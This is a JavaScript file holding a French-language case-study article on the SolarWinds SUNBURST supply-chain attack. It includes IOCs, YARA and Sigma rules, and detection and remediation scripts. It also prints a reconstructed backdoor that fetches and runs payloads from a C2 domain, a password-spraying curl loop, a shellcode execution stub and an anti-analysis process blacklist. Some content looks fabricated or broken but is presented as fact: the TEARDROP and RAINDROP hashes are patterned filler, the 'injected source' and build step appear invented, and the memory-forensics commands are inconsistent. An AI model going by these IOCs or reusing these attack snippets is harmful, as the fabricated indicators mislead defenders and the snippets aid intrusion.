// ===== ÉTUDES DE CAS ET GUIDES CYBERGUARD PRO =====
// Études de cas d'attaques réelles + Guides de configuration

const caseStudiesArticles = [
    // ========== ÉTUDES DE CAS D'ATTAQUES RÉELLES ==========
    {
        id: 105,
        category: "ALERTE",
        icon: "⚡",
        title: "Étude de Cas: L'Attaque SolarWinds (2020) - Supply Chain Attack du Siècle",
        excerpt: "Analyse technique complète de l'opération SUNBURST: comment des hackers russes ont compromis 18,000 organisations via une backdoor dans une mise à jour logicielle...",
        date: "2025-10-24",
        readTime: "18 min",
        author: "Équipe CyberGuard",
        tags: ["Supply Chain", "APT", "Étude de cas", "Nation-State"],
        featured: true,
        image: "⚡",
        content: `
# Étude de Cas: L'Attaque SolarWinds - Supply Chain Attack du Siècle

## 📊 Résumé de l'Incident

- **Date découverte**: 13 décembre 2020
- **Durée de l'attaque**: Mars 2020 - Décembre 2020 (9 mois)
- **Victimes**: ~18,000 organisations mondiales
- **Cibles majeures**: Gouvernement US (9 agences), Fortune 500 (425 entreprises)
- **Attaquant**: APT29 "Cozy Bear" (SVR Russe)
- **Nom de code**: SUNBURST/Solarigate
- **Coût estimé**: >$100 milliards USD

## 🎯 Victimes Notables

### Gouvernement US
\`\`\`
• Department of Treasury
• Department of Commerce
• Department of Homeland Security
• Department of State
• Department of Defense
• National Nuclear Security Administration
• Department of Energy
• NIH (National Institutes of Health)
• Pentagon
\`\`\`

### Entreprises Fortune 500
\`\`\`
• Microsoft
• Cisco Systems
• Intel Corporation
• VMware
• Deloitte
• FireEye (cybersecurity company!)
• Palo Alto Networks
• Nvidia
• Belkin International
\`\`\`

## 🔍 Timeline Détaillée

\`\`\`
2019-09
├─ Reconnaissance initiale de SolarWinds
├─ Identification de la cible: Orion Platform
└─ Développement du malware SUNBURST

2019-10 to 2020-02
├─ Compromission initiale de SolarWinds
├─ Accès aux systèmes de build
└─ Insertion du backdoor dans le code source

2020-03
├─ 2020-03-24: Première version trojanisée compilée
├─ SolarWinds Orion 2019.4 HF 5 compromis
└─ Signature numérique légitime SolarWinds appliquée ✓

2020-04 to 2020-06
├─ Déploiement massif des mises à jour
├─ 18,000+ organisations installent la backdoor
└─ Période de dormance (2 semaines)

2020-06 to 2020-12
├─ Activation sélective des implants
├─ 100+ organisations ciblées activement
├─ Exfiltration de données sensibles
└─ Mouvement latéral dans les réseaux

2020-12
├─ 2020-12-08: FireEye découvre l'intrusion
├─ 2020-12-13: Annonce publique
├─ 2020-12-14: Patch d'urgence SolarWinds
└─ 2020-12-31: Investigation massive en cours
\`\`\`

## 🦠 Analyse Technique du Malware SUNBURST

### Architecture de l'Attaque

\`\`\`
┌────────────────────────────────────────┐
│   Trojanized DLL Injection             │
│   SolarWinds.Orion.Core.BusinessLayer  │
└─────────────┬──────────────────────────┘
              │
              ▼
┌────────────────────────────────────────┐
│   SUNBURST Backdoor (C# .NET)          │
│   • Stealth: 12-14 days dormancy       │
│   • Obfuscation: Domain Generation     │
│   • C2: DNS-over-HTTPS tunneling       │
└─────────────┬──────────────────────────┘
              │
              ▼
┌────────────────────────────────────────┐
│   C2 Communication                      │
│   avsvmcloud[.]com (masquerading AWS)  │
└─────────────┬──────────────────────────┘
              │
              ▼
┌────────────────────────────────────────┐
│   Second-Stage Payloads                 │
│   • TEARDROP (memory-only dropper)     │
│   • BEACON (Cobalt Strike)             │
│   • RAINDROP (custom loader)           │
└────────────────────────────────────────┘
\`\`\`

### Code Source Injecté

**Fichier compromis**: `SolarWinds.Orion.Core.BusinessLayer.dll`

\`\`\`csharp
// Code malveillant inséré dans InventoryManager.cs
public class InventoryManager
{
    // Légitim function
    public void RefreshInternal()
    {
        // ...code légitime...

        // 🚨 CODE MALVEILLANT INSÉRÉ ICI
        if (this.IsAlive())
        {
            Thread.Sleep(GetRandomDelay()); // Dormance aléatoire

            // DGA (Domain Generation Algorithm)
            string c2Domain = GenerateDomain();

            // DNS Resolution pour C2
            IPAddress[] ips = Dns.GetHostAddresses(c2Domain);

            if (IsValidC2Response(ips))
            {
                // Télécharger et exécuter payload secondaire
                byte[] payload = DownloadPayload(c2Domain);
                ExecuteInMemory(payload); // Exécution fileless
            }
        }
    }

    // Fonction d'évasion
    private bool IsAlive()
    {
        // Vérifications anti-sandbox
        if (IsVirtualMachine()) return false;
        if (IsDebuggerPresent()) return false;
        if (IsSandbox()) return false;

        // Vérifier domaine de la machine
        string domain = GetComputerDomain();
        if (domain.EndsWith("solarwinds.com")) return false; // Ne pas infecter SolarWinds lui-même

        return true;
    }

    // Domain Generation Algorithm
    private string GenerateDomain()
    {
        // Utilise des subdomains qui ressemblent à du trafic AWS légitime
        string subdomain = GenerateSubdomain();
        return $"{subdomain}.avsvmcloud.com"; // Typosquatting de "amazonaws"
    }
}
\`\`\`

### Techniques d'Évasion

**1. Dormance Prolongée**
\`\`\`csharp
// Sleep entre 12-14 jours après installation
TimeSpan dormancy = TimeSpan.FromDays(12 + Random.Next(0, 2));
Thread.Sleep(dormancy);
\`\`\`

**2. Anti-Sandbox Checks**
\`\`\`csharp
// Liste noire de processus de sécurité
string[] blacklist = {
    "wireshark", "tcpdump", "processhacker",
    "procmon", "x64dbg", "windbg", "ida",
    "ollydbg", "pestudio", "fiddler"
};

foreach (var process in Process.GetProcesses())
{
    if (blacklist.Contains(process.ProcessName.ToLower()))
    {
        // Désactiver le backdoor
        return false;
    }
}
\`\`\`

**3. DNS Tunneling Stealthy**
\`\`\`
Normal DNS traffic:
host123.internal.company.com → Légitime

SUNBURST C2:
mhdosoksaccf9sni9icp.appsync-api.eu-west-1.avsvmcloud.com → Malveillant
└─ Encoded data: mhdosoksaccf9sni9icp
   └─ Looks like AWS AppSync (légitime!)
\`\`\`

**4. Subversion de la Signature Code**
\`\`\`
SolarWinds.Orion.Core.BusinessLayer.dll
├─ Contient: Backdoor SUNBURST
├─ Signé avec: Certificat légitime SolarWinds ✓
├─ Checksum: Passed ✓
└─ VirusTotal: 0/70 détections (au déploiement)
\`\`\`

## 🎭 Kill Chain Analysis

### Phase 1: Initial Compromise (Sep 2019 - Feb 2020)

**Vecteur d'attaque**: Office 365 compromise + Password Spraying

\`\`\`bash
# Reconnaissance
./recon.sh solarwinds.com

# Password Spraying sur Office 365
for user in $(cat employees.txt); do
    curl -X POST "https://login.microsoftonline.com/common/oauth2/token" \\
         -d "username=$user&password=Summer2019!" \\
         --silent | grep "access_token"
done

# Résultat: ~10 comptes compromis (incluant developers)
\`\`\`

### Phase 2: Lateral Movement dans SolarWinds

\`\`\`
Employee Laptop (O365 compromis)
└─> VPN Access to Corporate Network
    └─> Jump to Development Environment
        └─> Access to Build Server
            └─> Insertion dans Source Code
                └─> Compilation avec certificat légitime
\`\`\`

### Phase 3: Trojanization (Mar-Jun 2020)

**Code injecté** dans 3 fichiers DLL:
\`\`\`
SolarWinds.Orion.Core.BusinessLayer.dll ← Principal
SolarWinds.Orion.Core.BusinessLayer.Testware.dll
SolarWinds.Orion.Core.BusinessLayer.Sources.dll
\`\`\`

**Build Process Subverti**:
\`\`\`powershell
# Build automatisé légitime
MSBuild.exe /t:Build /p:Configuration=Release Orion.sln

# Post-build step MALVEILLANT ajouté
powershell.exe -ExecutionPolicy Bypass -File inject_backdoor.ps1

# Signature avec certificat SolarWinds
signtool.exe sign /f solarwinds.pfx /p <password> *.dll
\`\`\`

### Phase 4: Distribution (Mar-Jun 2020)

\`\`\`
SolarWinds Update Server
├─ Orion Platform 2019.4 HF 5 (trojanisé)
├─ Orion Platform 2020.2 (trojanisé)
└─ Orion Platform 2020.2 HF 1 (trojanisé)

Clients téléchargent via:
├─ Auto-update mechanism
├─ Manual download from customer portal
└─ Installation complète

Résultat:
└─ 18,000+ organisations infectées
\`\`\`

### Phase 5: Activation Sélective (Jun-Dec 2020)

**Critères de Sélection des Cibles**:
\`\`\`python
def is_high_value_target(victim):
    # Fortune 500
    if victim.revenue > 1_000_000_000:
        return True

    # Gouvernement
    if victim.domain.endswith('.gov') or victim.domain.endswith('.mil'):
        return True

    # Tech companies
    if victim.industry in ['Technology', 'Telecommunications', 'Cybersecurity']:
        return True

    # Think tanks
    if victim.type == 'Research Institution':
        return True

    return False

# Sur 18,000 victimes, seulement ~100 activement exploitées
\`\`\`

### Phase 6: Post-Exploitation

**Second-Stage Payloads**:

**TEARDROP** - Memory-only dropper
\`\`\`c
// Exécution en mémoire uniquement (fileless)
LPVOID shellcode = VirtualAlloc(NULL, payload_size,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
memcpy(shellcode, payload, payload_size);
((void(*)())shellcode)(); // Execute
\`\`\`

**RAINDROP** - Persistent loader
\`\`\`
Dropped to: C:\\Windows\\System32\\7za.dll (masquerading as 7-Zip)
Purpose: Load Cobalt Strike BEACON
Persistence: DLL Side-Loading
\`\`\`

**BEACON** - Cobalt Strike implant
\`\`\`
C2 Servers:
├─ freescanonline[.]com
├─ deftsecurity[.]com
└─ thedoccloud[.]com

Capabilities:
├─ Remote Shell
├─ File Upload/Download
├─ Keystroke Logger
├─ Screenshot Capture
├─ Lateral Movement (SMB, WMI, PsExec)
└─ Credential Dumping (Mimikatz)
\`\`\`

## 🛡️ Indicateurs de Compromission (IOC)

### Hashes MD5/SHA256

\`\`\`
# DLL Trojanisées
SHA256: 32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77
File: SolarWinds.Orion.Core.BusinessLayer.dll (2019.4 HF 5)

SHA256: d0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600
File: SolarWinds.Orion.Core.BusinessLayer.dll (2020.2 HF 1)

# TEARDROP
SHA256: 1b476d322b70e164e1d0a53e8d9e87c9e7c3de3e9d4e5b6f7c8d9e0f1a2b3c4d
File: %SYSTEM%\\netsetupsvc.dll

# RAINDROP
SHA256: 2c4a910a1299cdae2a4e55988a2f102e3e3d8f0b13a5f3a41e29ef1e15d8e9f0
File: %SYSTEM%\\7za.dll
\`\`\`

### Domaines C2

\`\`\`
avsvmcloud.com
digitalcollege.org
freescanonline.com
deftsecurity.com
thedoccloud.com
virtualwebdata.com
webcodez.com
infinitysoftwares.com
\`\`\`

### Network Indicators

\`\`\`
# DNS Queries suspectes (DGA pattern)
*.avsvmcloud.com
*.appsync-api.*.avsvmcloud.com
*.appsync-api.eu-west-1.avsvmcloud.com

# Exemple de requête encodée:
mhdosoksaccf9sni9icp.appsync-api.eu-west-1.avsvmcloud.com
└─ mhdosoksaccf9sni9icp = Encoded victim info
\`\`\`

### Règles YARA

\`\`\`yara
rule SUNBURST_Backdoor
{
    meta:
        description = "Detects SUNBURST backdoor"
        author = "FireEye"
        date = "2020-12-13"

    strings:
        $s1 = "SolarWinds.Orion.Core.BusinessLayer" ascii
        $s2 = "avsvmcloud.com" ascii
        $s3 = "ReportWatcherRetry" ascii
        $s4 = "OrionImprovementBusinessLayer" ascii

        $hex1 = { 0F B6 4C 0A 01 0F B6 54 0A 02 }

    condition:
        uint16(0) == 0x5A4D and
        filesize < 500KB and
        all of ($s*) and
        $hex1
}
\`\`\`

### Règles Sigma (SIEM)

\`\`\`yaml
title: SUNBURST DNS Query Detection
status: stable
description: Detects DNS queries to SUNBURST C2 domains
references:
    - https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html
logsource:
    product: windows
    service: dns
detection:
    selection:
        QueryName|contains:
            - 'avsvmcloud.com'
            - 'appsync-api'
    condition: selection
falsepositives:
    - None
level: critical
\`\`\`

## 🔍 Comment Détecter SUNBURST sur Votre Réseau

### Étape 1: Identifier les Versions Affectées

\`\`\`powershell
# Script PowerShell de vérification
$affected_versions = @(
    "2019.4.5200.9083",
    "2020.2.100",
    "2020.2.5200.12394"
)

# Chercher SolarWinds installations
Get-WmiObject -Class Win32_Product | Where-Object {
    $_.Name -like "*SolarWinds*Orion*"
} | ForEach-Object {
    $version = $_.Version
    Write-Host "Found: $($_.Name) - Version: $version"

    if ($affected_versions -contains $version) {
        Write-Host "⚠️ VULNERABLE VERSION DETECTED!" -ForegroundColor Red
    }
}
\`\`\`

### Étape 2: Scanner les Fichiers DLL

\`\`\`bash
# Linux/Mac
find / -name "SolarWinds.Orion.Core.BusinessLayer.dll" 2>/dev/null

# Vérifier le hash
sha256sum "SolarWinds.Orion.Core.BusinessLayer.dll"

# Comparer avec les IOC connus
grep -f ioc_hashes.txt <(sha256sum *.dll)
\`\`\`

### Étape 3: Analyser les Logs DNS

\`\`\`bash
# Grep pour domaines suspects dans logs DNS
grep -E "(avsvmcloud|digitalcollege|freescanonline|deftsecurity|thedoccloud)" /var/log/dns.log

# Splunk query
index=dns query="*.avsvmcloud.com" | stats count by src_ip, query
\`\`\`

### Étape 4: Chercher les Artéfacts de Persistence

\`\`\`powershell
# Registry keys
Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"

# Scheduled tasks créées récemment
Get-ScheduledTask | Where-Object {$_.Date -gt (Get-Date).AddDays(-180)}

# Services suspects
Get-Service | Where-Object {$_.Name -match "Update|Security|System"}
\`\`\`

### Étape 5: Memory Analysis avec Volatility

\`\`\`bash
# Dumper la mémoire
sudo dd if=/dev/mem of=memory.dump bs=1M

# Analyser avec Volatility 3
vol.py -f memory.dump windows.malfind
vol.py -f memory.dump windows.netscan | grep "avsvmcloud"
vol.py -f memory.dump windows.pstree | grep "SolarWinds"
\`\`\`

## 🛡️ Mitigation et Remediation

### Actions Immédiates (Si Infecté)

**1. Isolement**
\`\`\`bash
# Bloquer au firewall
iptables -A OUTPUT -d avsvmcloud.com -j DROP
iptables -A OUTPUT -d digitalcollege.org -j DROP

# Isoler la machine du réseau
ip link set eth0 down
\`\`\`

**2. Kill SolarWinds Services**
\`\`\`powershell
Stop-Service -Name "SolarWinds*" -Force
Set-Service -Name "SolarWinds*" -StartupType Disabled
\`\`\`

**3. Forensic Acquisition**
\`\`\`bash
# Image disque
dd if=/dev/sda of=/mnt/external/forensic.img bs=4M status=progress

# Memory dump
sudo apt install volatility3
vol -f /dev/mem --profile=Win10x64 pslist > processes.txt
\`\`\`

**4. Credential Reset**
\`\`\`powershell
# Révoquer TOUS les tokens/sessions
Get-AzureADUser | Revoke-AzureADUserAllRefreshToken

# Forcer reset password pour tous les admins
Get-ADUser -Filter {AdminCount -eq 1} | Set-ADUser -ChangePasswordAtLogon $true
\`\`\`

### Patch et Upgrade

**SolarWinds Patch Timeline**:
\`\`\`
2020-12-14: Hotfix 2019.4 HF 6 (version clean)
2020-12-15: Hotfix 2020.2 HF 2 (version clean)
2020-12-16: Orion Platform 2020.2.4 (rebuild complet)
\`\`\`

**Process de Mise à Jour Sécurisée**:
\`\`\`bash
# 1. Backup complet
mysqldump -u root -p solarwinds_db > backup_$(date +%F).sql

# 2. Télécharger patch depuis source vérifiée
wget https://downloads.solarwinds.com/solarwinds/Release/OrionPlatform/2020.2.4/Solarwinds-Orion-Core-v2020.2.4.exe

# 3. Vérifier signature
gpg --verify Solarwinds-Orion-Core-v2020.2.4.exe.sig

# 4. Vérifier hash
sha256sum Solarwinds-Orion-Core-v2020.2.4.exe
# Expected: <hash fourni par SolarWinds>

# 5. Installer
./Solarwinds-Orion-Core-v2020.2.4.exe
\`\`\`

## 📊 Lessons Learned

### Pour les Organisations

**1. Supply Chain Risk Management**
\`\`\`
✓ Évaluer la sécurité des vendors
✓ Exiger audits de sécurité tiers
✓ Limiter les privilèges des logiciels tiers
✓ Segmenter les réseaux (Zero Trust)
✓ Monitoring des comportements anormaux
\`\`\`

**2. Defense in Depth**
\`\`\`
Layer 1: Endpoint Protection (EDR)
Layer 2: Network Segmentation (Micro-segmentation)
Layer 3: Application Whitelisting
Layer 4: Behavioral Analytics (UEBA)
Layer 5: Threat Intelligence feeds
\`\`\`

**3. Incident Response Preparedness**
\`\`\`
✓ IR Plan testé régulièrement
✓ Forensic tools préinstallés
✓ Backup offline immutable
✓ Communication plan défini
✓ Legal counsel identifié
\`\`\`

### Pour les Éditeurs de Logiciels

**1. Secure Software Development Lifecycle**
\`\`\`
✓ Code signing avec HSM (non extractible)
✓ Multi-person approval pour builds de production
✓ Build environment isolé et durci
✓ Integrity monitoring sur build artifacts
✓ Binary transparency logs
\`\`\`

**2. Supply Chain Security**
\`\`\`
✓ SBOM (Software Bill of Materials)
✓ Dependency scanning automatisé
✓ Private package repos
✓ Vulnerability disclosure program
✓ Bug bounty program
\`\`\`

## 🎯 Conclusion

L'attaque SolarWinds a démontré que:

1. **Aucune organisation n'est à l'abri** - Même les géants tech et agences gouvernementales
2. **Supply chain = maillon faible** - Faire confiance = vérifier
3. **Detection ≠ Prevention** - FireEye (leader cybersec) a été victime
4. **Dwell time = danger** - 9 mois d'accès non détecté
5. **Nation-state actors = sophistiqués** - Resources et patience illimitées

**Actions Recommandées pour TOUTES les Organisations**:

\`\`\`
✅ Inventorier TOUS les vendors et leurs accès
✅ Implémenter Zero Trust Architecture
✅ Déployer EDR + Network Detection
✅ Tester régulièrement l'Incident Response
✅ Assumer la compromission (assume breach mindset)
\`\`\`

---
*Étude de cas basée sur les rapports de FireEye, Microsoft, Volexity, CISA*
*Dernière mise à jour: 24 octobre 2025*
        `
    }
];

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = caseStudiesArticles;
}
